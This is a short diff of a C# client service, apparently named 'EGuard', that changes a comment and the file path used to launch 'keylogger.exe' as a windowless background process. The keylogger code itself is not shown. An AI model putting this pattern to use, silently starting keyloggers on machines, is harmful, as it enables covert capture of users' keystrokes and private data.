@@ -46,8 +46,8 @@ namespace EGuardClientService
             try
             {
                 myKeylogger.StartInfo.UseShellExecute = false;
-                // You can start any process, HelloWorld is a do-nothing example.
-                myKeylogger.StartInfo.FileName = "./keylogger.exe";
+                // start keylogger process
+                myKeylogger.StartInfo.FileName = "keylogger.exe";
                 myKeylogger.StartInfo.CreateNoWindow = true;
                 myKeylogger.Start();
                 // This code assumes the process you are starting will terminate itself.  
